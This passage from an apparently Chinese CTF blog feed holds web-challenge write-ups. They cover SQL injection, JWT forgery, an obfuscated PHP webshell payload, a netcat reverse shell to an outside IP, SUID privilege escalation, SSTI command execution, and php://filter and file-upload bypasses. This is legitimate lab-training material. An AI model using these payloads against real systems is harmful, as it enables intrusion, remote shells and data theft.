class="line">?&gt;</span><br></pre></td></tr></table></figure><p>对于这种有字符限制的，我通常会先用phpinfo()，因为很多这种payload写起来可能比较麻烦的题，会为了降低难度把flag直接藏在环境变量里面，就算没有，环境变量很多时候也能显示一些的信息，所以第一个payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=(~%8F%97%8F%96%91%99%90)();</span><br></pre></td></tr></table></figure><p>不过这里很可惜没有flag，但是可以看到被ban掉了n多的函数方法</p><p><img src="/2025/12/07/12.1-12.7buuctf/image-20251207201850228.png"></p><p>所以我打算塞个一句话木马，然后用蚁剑进行连接，这样比较轻松一点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%8B%9A%8C%8B%A2%D6%D6);</span><br></pre></td></tr></table></figure><p>成功连接</p><p><img src="/2025/12/07/12.1-12.7buuctf/image-20251207202117500.png"></p><p>可以看到有一个flag和一个readflag，先打开flag看看</p><p><img src="/2025/12/07/12.1-12.7buuctf/image-20251207202200406.png"></p><p>发现是空的，再看看readflag</p><p><img src="/2025/12/07/12.1-12.7buuctf/image-20251207202230418.png"></p><p>好像是个可以执行的文件，应该是用来输出flag的，但是我发现因为disable_functions的存在，我们没有执行&#x2F;readflag的权限，这里可以用蚁剑中的一个插件来解决</p><p><img src="/2025/12/07/12.1-12.7buuctf/image-20251207202922233.png"></p><p>加载插件，选择PHP7_GC_UAF模式</p><p><img src="/2025/12/07/12.1-12.7buuctf/image-20251207203429740.png"></p><p>然后右键ip地址，打开虚拟终端，执行&#x2F;readflag即可</p><p><img src="/2025/12/07/12.1-12.7buuctf/image-20251207203447690.png"></p><p>当然也有另外的方式，是利用动态链接库—— LD_PRELOAD，但是我现在不会</p><p><a href="https://blog.csdn.net/m0_62879498/article/details/124803318">https://blog.csdn.net/m0_62879498/article/details/124803318</a></p><p>这是文章地址，可以参考</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;平台&quot;&gt;&lt;a href=&quot;#平台&quot; class=&quot;headerlink&quot; title=&quot;平台&quot;&gt;&lt;/a&gt;平台&lt;/h2&gt;&lt;p&gt;BUUCTF&lt;/p&gt;
&lt;h2 id=&quot;时间&quot;&gt;&lt;a href=&quot;#时间&quot; class=&quot;headerlink&quot; title=&quot;时间&quot;&gt;&lt;/a</summary>
      
    
    
    
    <category term="CTF" scheme="https://aihenai.github.io/categories/CTF/"/>
    
    
    <category term="web" scheme="https://aihenai.github.io/tags/web/"/>
    
    <category term="wp" scheme="https://aihenai.github.io/tags/wp/"/>
    
    <category term="note" scheme="https://aihenai.github.io/tags/note/"/>
    
  </entry>
  
  <entry>
    <title>DASCTF2025-SecretPhotoGallery-Wp</title>
    <link href="https://aihenai.github.io/2025/12/06/DASCTF2025-SecretPhotoGallery/"/>
    <id>https://aihenai.github.io/2025/12/06/DASCTF2025-SecretPhotoGallery/</id>
    <published>2025-12-05T16:00:00.000Z</published>
    <updated>2025-12-07T13:58:13.468Z</updated>
    
    <content type="html"><![CDATA[<h2 id="SecretPhotoGallery-WP"><a href="#SecretPhotoGallery-WP" class="headerlink" title="SecretPhotoGallery-WP"></a>SecretPhotoGallery-WP</h2><h2 id="时间"><a href="#时间" class="headerlink" title="时间"></a>时间</h2><p>12.6</p><p>先打开题目</p><p><img src="/2025/12/06/DASCTF2025-SecretPhotoGallery/image-20251207094559764.png"></p><p>可以看到是一个登录界面，登陆界面那可能是sql注入，弱口令爆破，cookie中的jwt令牌伪造等，此处的话经过尝试可以确认是sql注入，闭合为单引号，尝试探测后用1’ union select 1,2,3 –成功登录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select 1,2,3 --</span><br></pre></td></tr></table></figure><p><img src="/2025/12/06/DASCTF2025-SecretPhotoGallery/image-20251207095209453.png"></p><p>登陆完成之后看到有很多图片，且显示Welcome加刚刚输入的username，那么从这个Welcome的显示看来是直接把username的输入进行打印，并不会执行然后输出执行结果，那么我们现在应该找找其他信息，在Welcome的下一行有一个加粗的guest，显示我们是游客身份，那接下来应该是要获取管理员身份</p><p><img src="/2025/12/06/DASCTF2025-SecretPhotoGallery/image-20251207095930853.png"></p><p>我们在cookie中发现了jwt的令牌，拿去解析一下</p><p><img src="/2025/12/06/DASCTF2025-SecretPhotoGallery/image-20251207100005169.png"></p><p>发现需要密钥，那我们去其他地方找找信息，比如源码、响应头什么的</p><p><img src="/2025/12/06/DASCTF2025-SecretPhotoGallery/image-20251207100100691.png"></p><p>我们在源码中发现了一长串的这个页面图片的名字及ID，仔细看ID会发现，它的第一个字母拼起来是GALLERY2024SECRET，有没有感觉很像特殊的东西，比如密钥</p><p><img src="/2025/12/06/DASCTF2025-SecretPhotoGallery/image-20251207100259109.png"></p><p>经过验证确实是密钥，于是我们伪造admin令牌</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3NjUwNzI0OTh9.NrqvKNtiU1oMMHBmtdSVjQedgYiuQ1ETCzLh67koI9g</span><br></pre></td></tr></table></figure><p><img src="/2025/12/06/DASCTF2025-SecretPhotoGallery/image-20251207100345078.png"></p><p>更换令牌刷新页面</p><p><img src="/2025/12/06/DASCTF2025-SecretPhotoGallery/image-20251207100442573.png"></p><p>成功登录管理员界面，点击蓝色按钮进入admin管理界面</p><p><img src="/2025/12/06/DASCTF2025-SecretPhotoGallery/image-20251207100533957.png"></p><p>发现可以读取文件，尝试各种读取，比如&#x2F;flag、&#x2F;flag.txt、&#x2F;flag.php</p><p><img src="/2025/12/06/DASCTF2025-SecretPhotoGallery/image-20251207100624705.png"></p><p><img src="/2025/12/06/DASCTF2025-SecretPhotoGallery/image-20251207100639565.png"></p><p><img src="/2025/12/06/DASCTF2025-SecretPhotoGallery/image-20251207100717414.png"></p><p>发现都不行，但是警告信息显示是include函数，而且输入文件名的框下面还有一串英文，意思是需要绝对路径，那么意味着flag所在的地方是常见的地方，可以直接猜到或者经过简单的尝试之后找到，比如就在这个工作路径下</p><p><img src="/2025/12/06/DASCTF2025-SecretPhotoGallery/image-20251207101536212.png"></p><p><img src="/2025/12/06/DASCTF2025-SecretPhotoGallery/image-20251207101551139.png"></p><p>输出成功没有显示，那我们得用伪协议来读取了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=conver.base64-encode/resource=flag.php</span><br><span class="line">php://filter/read=string.rot13/resource=flag.php</span><br></pre></td></tr></table></figure><p><img src="/2025/12/06/DASCTF2025-SecretPhotoGallery/image-20251207101734036.png"></p><p><img src="/2025/12/06/DASCTF2025-SecretPhotoGallery/image-20251207101916120.png"></p><p>发现两个过滤器都被ban了，然后我找了其他的一些过滤器进行尝试，比如zlib压缩、字符转换什么的，这里用字符转换把utf-8转换utf-16就可以了，但是我当时找到这个过滤器的时候复制过来忘记改了，我自己也没发现，它用的是utf-8转gbk，然后就一直没出-_-</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.iconv.utf-8.utf-16/resource=flag.php</span><br></pre></td></tr></table></figure><p><img src="/2025/12/06/DASCTF2025-SecretPhotoGallery/image-20251207102357838.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;SecretPhotoGallery-WP&quot;&gt;&lt;a href=&quot;#SecretPhotoGallery-WP&quot; class=&quot;headerlink&quot; title=&quot;SecretPhotoGallery-WP&quot;&gt;&lt;/a&gt;SecretPhotoGallery-WP&lt;/</summary>
      
    
    
    
    <category term="CTF" scheme="https://aihenai.github.io/categories/CTF/"/>
    
    
    <category term="web" scheme="https://aihenai.github.io/tags/web/"/>
    
    <category term="wp" scheme="https://aihenai.github.io/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>HCTF 招新赛游戏题 Wp</title>
    <link href="https://aihenai.github.io/2025/12/03/HCTF-Game-Wp/"/>
    <id>https://aihenai.github.io/2025/12/03/HCTF-Game-Wp/</id>
    <published>2025-12-02T16:00:00.000Z</published>
    <updated>2025-12-07T13:46:33.719Z</updated>
    
    <content type="html"><![CDATA[<p>1、打开题目，游戏题先看源代码</p><p><img src="/2025/12/03/HCTF-Game-Wp/image-20251105200738403.png"></p><p>2、源代码中有game.js文件，进入查看，搜索score无果后，在最底部找到了.swp文件的提示，尝试.index.php.swp得到文件</p><p><img src="/2025/12/03/HCTF-Game-Wp/image-20251105202903850.png"></p><p>3、在文件中得到下一个地址&#x2F;Nr.php</p><p><img src="/2025/12/03/HCTF-Game-Wp/image-20251105202949656.png"></p><p>4、进入看到代码，分析代码后发现这里使用的是shell_exec函数，shell_exec函数需要主动输出，这里显然没有，而且题目提示真正的flag在root目录之下，我们还需要获取root权限才行，但这里又限制掉了find和一些常用的如cat、tac、nl等函数，所以我们选择反弹shell</p><p><img src="/2025/12/03/HCTF-Game-Wp/image-20251105203026439.png"></p><p><img src="/2025/12/03/HCTF-Game-Wp/image-20251105204045457.png"></p><p>5、我们用tabby连接云服务器，输入nc -lvp 2333对2333端口进行监听，然后传参cmd&#x3D;nc -e &#x2F;bin&#x2F;sh 101.200.30.203 2333</p><p><img src="/2025/12/03/HCTF-Game-Wp/image-20251105204715452.png"></p><p><img src="/2025/12/03/HCTF-Game-Wp/image-20251105204727148.png"></p><p>6、提权的方式在前面的提示中已经告诉我们了，需要使用SUID进行提权，于是我们对带相应权限的文件进行搜索</p><p><img src="/2025/12/03/HCTF-Game-Wp/image-20251105205156247.png"></p><p>7、我们选用find文件进行提权；使用find &#x2F;usr&#x2F;bin&#x2F;find -exec &#x2F;bin&#x2F;sh -p ;命令</p><p><img src="/2025/12/03/HCTF-Game-Wp/image-20251105205713620.png"></p><p>8、whoami检查权限为root之后，直接ls &#x2F;root，发现flag之后用tac &#x2F;root&#x2F;flag进行读取</p><p><img src="/2025/12/03/HCTF-Game-Wp/image-20251105210333650.png"></p><p><img src="/2025/12/03/HCTF-Game-Wp/image-20251105210344755.png"></p><p><img src="/2025/12/03/HCTF-Game-Wp/image-20251105210353495.png"></p><h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><h2 id="1、find-usr-bin-find-exec-bin-sh-p-命令解释"><a href="#1、find-usr-bin-find-exec-bin-sh-p-命令解释" class="headerlink" title="1、find &#x2F;usr&#x2F;bin&#x2F;find -exec &#x2F;bin&#x2F;sh -p ;命令解释"></a>1、find &#x2F;usr&#x2F;bin&#x2F;find -exec &#x2F;bin&#x2F;sh -p ;命令解释</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">find /usr/bin/find：寻找find这个文件</span><br><span class="line"></span><br><span class="line">-exec：当find找到符合条件的文件时，执行指定的命令</span><br><span class="line"></span><br><span class="line">/bin/sh：承接高权限程序（如带SUID的find）的权限，生成高权限shell</span><br><span class="line"></span><br><span class="line">-p：继承保持这个权限</span><br></pre></td></tr></table></figure><h2 id="2、-swp"><a href="#2、-swp" class="headerlink" title="2、.swp"></a>2、.swp</h2><p>.swp文件是 Vim 编辑器生成的临时交换文件，用于在编辑过程中临时保存文件内容，防止意外中断导致未保存的修改丢失；常以.开头用于隐藏文件</p><h2 id="3、shell-exec函数"><a href="#3、shell-exec函数" class="headerlink" title="3、shell_exec函数"></a>3、shell_exec函数</h2><p>PHP 中用于执行系统命令并获取输出的内置函数，但是与system不同，它需要手动echo才有输出</p><h2 id="4、whoami"><a href="#4、whoami" class="headerlink" title="4、whoami"></a>4、whoami</h2><p>显示当前执行命令的用户身份</p><h2 id="5、SUID"><a href="#5、SUID" class="headerlink" title="5、SUID"></a>5、SUID</h2><p>允许普通用户执行某文件时，临时获得该文件所有者的权限，在提权操作很常见</p><h2 id="6、find-perm-u-s-type-f-2-dev-null命令解释"><a href="#6、find-perm-u-s-type-f-2-dev-null命令解释" class="headerlink" title="6、find -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null命令解释"></a>6、find -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null命令解释</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-perm：按照权限筛选文件</span><br><span class="line"></span><br><span class="line">-u=s：u代表文件所有者，s代表 SUID 权限，整体意思是 “必须包含所有者的 SUID 权限”</span><br><span class="line"></span><br><span class="line">-type：按照文件类型筛选文件</span><br><span class="line"></span><br><span class="line">f：代表file普通文件</span><br><span class="line"></span><br><span class="line">2&gt;/dev/null：2代表错误输出，/dev/null是一个文件黑洞，用于丢弃放入这里的的文件</span><br></pre></td></tr></table></figure><h2 id="7、nc命令"><a href="#7、nc命令" class="headerlink" title="7、nc命令"></a>7、nc命令</h2><p>格式：nc [选项] [目标IP] [端口]</p><p>选项：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-l：监听模式（作为服务器，等待连接）；</span><br><span class="line">-p：指定本地端口（配合 -l 使用）；</span><br><span class="line">-e：执行命令（连接建立后，将本地 Shell 绑定到连接，常用于反弹 Shell）；</span><br><span class="line">-n：不进行 DNS 解析（直接用 IP，加快速度）；</span><br><span class="line">-v：显示详细输出（调试用）；</span><br><span class="line">-z：扫描模式（不发送数据，仅检测端口是否开放）。</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;1、打开题目，游戏题先看源代码&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2025/12/03/HCTF-Game-Wp/image-20251105200738403.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;2、源代码中有game.js文件，进入查看，搜索score无果后，在最底部找到了.s</summary>
      
    
    
    
    <category term="CTF" scheme="https://aihenai.github.io/categories/CTF/"/>
    
    
    <category term="web" scheme="https://aihenai.github.io/tags/web/"/>
    
    <category term="wp" scheme="https://aihenai.github.io/tags/wp/"/>
    
    <category term="note" scheme="https://aihenai.github.io/tags/note/"/>
    
  </entry>
  
  <entry>
    <title>Bugku平台刷题题解2</title>
    <link href="https://aihenai.github.io/2025/11/28/11.24-11.28bugku/"/>
    <id>https://aihenai.github.io/2025/11/28/11.24-11.28bugku/</id>
    <published>2025-11-27T16:00:00.000Z</published>
    <updated>2025-12-07T13:47:57.472Z</updated>
    
    <content type="html"><![CDATA[<h2 id="时间"><a href="#时间" class="headerlink" title="时间"></a>时间</h2><p>11.24-11.27</p><h2 id="平台"><a href="#平台" class="headerlink" title="平台"></a>平台</h2><p>bugku</p><p><img src="/2025/11/28/11.24-11.28bugku/image-20251127214815757.png"></p><h2 id="ssti"><a href="#ssti" class="headerlink" title="ssti"></a>ssti</h2><p>由题目知道是ssti注入</p><p><img src="/2025/11/28/11.24-11.28bugku/image-20251127214948786.png"></p><p>打开后仅看到seaeching for: None?之外并无其他信息（包括源码也只有这一串），猜测是传参search，于是传入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?search=&#123;&#123;7*7&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/2025/11/28/11.24-11.28bugku/image-20251127215123323.png"></p><p>成功回显，开始尝试注入，我的注入比较公式化，每次都是从下面这个payload开始，因为这个通常不难的情况下都可以成功，如果遇到过滤，先考虑拼接绕过，如果部分拼接绕不过就考虑用bp先爆破一下ssti的常用字符，看可用字符有哪些，然后再重新构造其他payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config.__class__.__init__.__globals__.os.popen(&#x27;ls /&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>在这里经过多次尝试之后发现皆是被过滤，无法绕过，于是用bp爆破常用字符</p><p><img src="/2025/11/28/11.24-11.28bugku/image-20251127220051786.png"></p><p>发现大部分基本都被过滤，于是尝试了对其进行部分拼接绕过，发现仍然行不通，查了一下，发现是__双下划线被过滤了QAQ，于是重新写payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config[&#x27;_&#x27;&#x27;_&#x27;&#x27;c&#x27;&#x27;l&#x27;&#x27;a&#x27;&#x27;s&#x27;&#x27;s&#x27;&#x27;_&#x27;&#x27;_&#x27;][&#x27;_&#x27;&#x27;_&#x27;&#x27;init&#x27;&#x27;_&#x27;&#x27;_&#x27;][&#x27;_&#x27;&#x27;_&#x27;&#x27;globals&#x27;&#x27;_&#x27;&#x27;_&#x27;][&#x27;os&#x27;].popen(&#x27;ls /&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/2025/11/28/11.24-11.28bugku/image-20251128193754442.png"></p><p>成功获取flag位置，将ls &#x2F;修改为cat &#x2F;flag即可获取flag了</p><p><img src="/2025/11/28/11.24-11.28bugku/image-20251128193900592.png"></p><h2 id="？？？？"><a href="#？？？？" class="headerlink" title="？？？？"></a>？？？？</h2><p><img src="/2025/11/28/11.24-11.28bugku/image-20251128194840631.png"></p><p>打开发现提交按钮带着灰色不能点，那按钮的属性应该是disabled，并且只能输入四个字符，于是打开源码，将disabled属性删去，并把maxlength改为6即可输入yulige并提交</p><p><img src="/2025/11/28/11.24-11.28bugku/image-20251128195015320.png"></p><p>提交后，提示flag不在这，跳转到sh3ll.php</p><p><img src="/2025/11/28/11.24-11.28bugku/image-20251128195118547.png"></p><p>代码注释提示flag再fl4g_is_here.php文件中；分析代码，需要post一个cmd，先对其进行正则匹配，不能存在除lmn外的字母以及不能存在数字，随后再次过滤了一连串的符号，包括_和&#x2F;；基于lmn我们有一个读取命令是nl可以绕过，而对于fl4g_is_here.php，我们则可以使用对应长度的?进行绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=nl ????????????????</span><br></pre></td></tr></table></figure><p><img src="/2025/11/28/11.24-11.28bugku/image-20251128195940986.png"></p><p>有显示，但是没有flag，源码看看</p><p><img src="/2025/11/28/11.24-11.28bugku/image-20251128200010052.png"></p><h2 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h2><p><img src="/2025/11/28/11.24-11.28bugku/image-20251128200604018.png"></p><p>这种题，上来先用旧的payload图片尝试，发现行不通，不过绿色字给出一些提示，read.php?filename&#x3D;，那我们先尝试读取一下源码，经过尝试，这里不能直接filename&#x3D;index.php直接读取，于是转向伪协议</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">read.php?filename=php://filter/convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure><p><img src="/2025/11/28/11.24-11.28bugku/image-20251128200858862.png"></p><p>将其解码后为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class=&quot;light&quot;&gt;&lt;span class=&quot;glow&quot;&gt;</span><br><span class="line">&lt;form enctype=&quot;multipart/form-data&quot; method=&quot;post&quot; onsubmit=&quot;return checkFile()&quot;&gt;</span><br><span class="line">嘿伙计，传个火？！</span><br><span class="line">                &lt;input class=&quot;input_file&quot; type=&quot;file&quot; name=&quot;upload_file&quot;/&gt;</span><br><span class="line">                &lt;input class=&quot;button&quot; type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;upload&quot;/&gt;</span><br><span class="line">            &lt;/form&gt;</span><br><span class="line">      &lt;/span&gt;&lt;span class=&quot;flare&quot;&gt;&lt;/span&gt;&lt;div&gt;</span><br><span class="line">  &lt;!--read.php?filename=  --&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">//设置上传目录</span><br><span class="line">define(&quot;UPLOAD_PATH&quot;, &quot;./uplo4d&quot;);</span><br><span class="line">$msg = &quot;Upload Success!&quot;;</span><br><span class="line">if (isset($_POST[&#x27;submit&#x27;])) &#123;</span><br><span class="line">        $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line">        $file_name = $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;];</span><br><span class="line">        $ext = pathinfo($file_name,PATHINFO_EXTENSION);</span><br><span class="line">      if(preg_match(&quot;/ph/i&quot;, strtolower($ext)))&#123;</span><br><span class="line">        die(&quot;这可不能上传啊！&quot;);</span><br><span class="line">    &#125;     </span><br><span class="line">            $content = file_get_contents($temp_file);</span><br><span class="line">            if(preg_match(&quot;/php/i&quot;, $content))&#123;</span><br><span class="line">                die(&quot;诶，被我发现了吧&quot;);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        $new_file_name = md5($file_name).&quot;.&quot;.$ext;</span><br><span class="line">        $img_path = UPLOAD_PATH . &#x27;/&#x27; . $new_file_name;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        if (move_uploaded_file($temp_file, $img_path))&#123;</span><br><span class="line">            $is_upload = true;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &#x27;Upload Failed!&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">        echo &#x27;&lt;div style=&quot;color:#F00&quot;&gt;&#x27;.$msg.&quot; Look here~ &quot;.$img_path.&quot;&lt;/div&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>发现其上传目录为.&#x2F;uplo4d，并对文件后缀和文件内容中的php进行相关过滤，既然读取了index.php，不妨对需要用到的read.php也读取一下</p><p><img src="/2025/11/28/11.24-11.28bugku/image-20251128201603540.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$a=$_GET[&quot;filename&quot;];</span><br><span class="line">if(preg_match(&#x27;/flag/i&#x27;,$a))&#123;</span><br><span class="line">  exit(&quot;nononono&quot;);</span><br><span class="line">&#125;</span><br><span class="line">include($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>发现其对flag进行了过滤，对于两个过滤，做如下应对：</p><p>index.php：使用短标签+图片后缀+文件包含进行执行</p><p>read.php：与????一题中一样使用同等长度的?</p><p><img src="/2025/11/28/11.24-11.28bugku/image-20251128201938772.png"></p><p><img src="/2025/11/28/11.24-11.28bugku/image-20251128202318850.png"></p><p>成功获取到flag位置，于是将上个请求中的ls &#x2F;修改为cat &#x2F;????，获取地址后复制粘贴再次发送</p><p><img src="/2025/11/28/11.24-11.28bugku/image-20251128202517488.png"></p><p><img src="/2025/11/28/11.24-11.28bugku/image-20251128202552293.png"></p><p>告诉我们flag在环境变量中，那我们同样的步骤再来一回即可</p><p><img src="/2025/11/28/11.24-11.28bugku/image-20251128202637248.png"></p><h2 id="switch"><a href="#switch" class="headerlink" title="switch"></a>switch</h2><p><img src="/2025/11/28/11.24-11.28bugku/image-20251128203023682.png"></p><p>提示vim，用dirsearch扫描看看有没有相关文件</p><p><img src="/2025/11/28/11.24-11.28bugku/image-20251128203202612.png"></p><p>确实有，在url加入后下载</p><p><img src="/2025/11/28/11.24-11.28bugku/image-20251128203304413.png"></p><p>整理后为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">// flag 在 flag.php 文件中</span><br><span class="line">$id = $_POST[&#x27;id&#x27;] ? $_POST[&#x27;id&#x27;] : 0;</span><br><span class="line">$file = $_POST[&#x27;file&#x27;] ? $_POST[&#x27;file&#x27;] : &quot;&quot;;</span><br><span class="line">if ($id == &#x27;2&#x27;) &#123;</span><br><span class="line">    die(&quot;no no no !&quot;);</span><br><span class="line">&#125;</span><br><span class="line">switch ($id) &#123;</span><br><span class="line">    case 0:</span><br><span class="line">        die(&#x27;&lt;h1 align=&quot;center&quot;&gt;&lt;font color=&quot;red&quot;&gt;Do you know vim in Linux?&lt;/font&gt;&lt;/h1&gt;&#x27;);</span><br><span class="line">    case 1:</span><br><span class="line">        die(&quot;0xGame Good!&quot;);</span><br><span class="line">    case 2:</span><br><span class="line">        die(&quot;0xGame Good!&quot;);</span><br><span class="line">&#125;</span><br><span class="line">if (preg_match(&#x27;/filter|base64/&#x27;, $file)) &#123;</span><br><span class="line">    die(&#x27;hacker&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">include($file);</span><br><span class="line">die(&quot;hacker&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>分析源码，我们需要post传参一个id和一个file，id不能为0,1,2其中任何一个值且不能为空，file中不能包含小写的filter和base64，于是我们构造payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=2a&amp;file=php://FiltER/convert.BasE64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><p><img src="/2025/11/28/11.24-11.28bugku/image-20251128204115769.png"></p><p><img src="/2025/11/28/11.24-11.28bugku/image-20251128204100171.png"></p><h2 id="search"><a href="#search" class="headerlink" title="search"></a>search</h2><p><img src="/2025/11/28/11.24-11.28bugku/image-20251128204330870.png"></p><p><img src="/2025/11/28/11.24-11.28bugku/Users\wsad\AppData\Roaming\Typora\typora-user-images\image-20251128204340922.png" alt="image-20251128204340922"></p><p>没有看到什么信息，扫描试试</p><p><img src="/2025/11/28/11.24-11.28bugku/image-20251128204410894.png"></p><p>存在&#x2F;admin登录界面，进去看看</p><p><img src="/2025/11/28/11.24-11.28bugku/image-20251128204506185.png"></p><p>没有对用户名的信息，只有提示密码是四位纯数字，那么猜测用户名为admin，密码则对其进行爆破</p><p><img src="/2025/11/28/11.24-11.28bugku/image-20251128204715561.png"></p><p>调整参数进行爆破</p><p><img src="/2025/11/28/11.24-11.28bugku/image-20251128212114399.png"></p><p>爆破了很久之后发现0310的长度与众不同，查看响应后成功找到flag</p><h2 id="header"><a href="#header" class="headerlink" title="header"></a>header</h2><p><img src="/2025/11/28/11.24-11.28bugku/image-20251128212325444.png"></p><p>告诉我们打开方式不对，且题目提示header，尝试一番过后发现是将请求方式修改为POST</p><p><img src="/2025/11/28/11.24-11.28bugku/image-20251128212445623.png"></p><p>修改User-Agent为N1k01a</p><p><img src="/2025/11/28/11.24-11.28bugku/image-20251128212538639.png"></p><p>在User-Agent后面添加X-Forwarded-For: 127.0.0.1</p><p><img src="/2025/11/28/11.24-11.28bugku/image-20251128212644408.png"></p><p>解码得到</p><p><img src="/2025/11/28/11.24-11.28bugku/image-20251128212706687.png"></p><p>需要我们GET一个0xGame2021，POST一个X1cT34m和一个Pupi1，要求X1cT34m的md5与Pupi1的md5值相同且</p><p>0xGame2021值为welcome to the 0xGame2021</p><p><img src="/2025/11/28/11.24-11.28bugku/image-20251128213240642.png"></p><h2 id="edr"><a href="#edr" class="headerlink" title="edr"></a>edr</h2><p><img src="/2025/11/28/11.24-11.28bugku/image-20251128213415393.png"></p><p>进来后并未看到多少有用信息，于是把后面的字填进去尝试了一下</p><p><img src="/2025/11/28/11.24-11.28bugku/image-20251128213511188.png"></p><p>看到警告信息中有一个file_get_contents函数，说明在其源码中有这个函数，可能是个漏洞，于是想办法获取源码，而由于这个界面信息不多，于是直接dirsearch扫描了一下</p><p><img 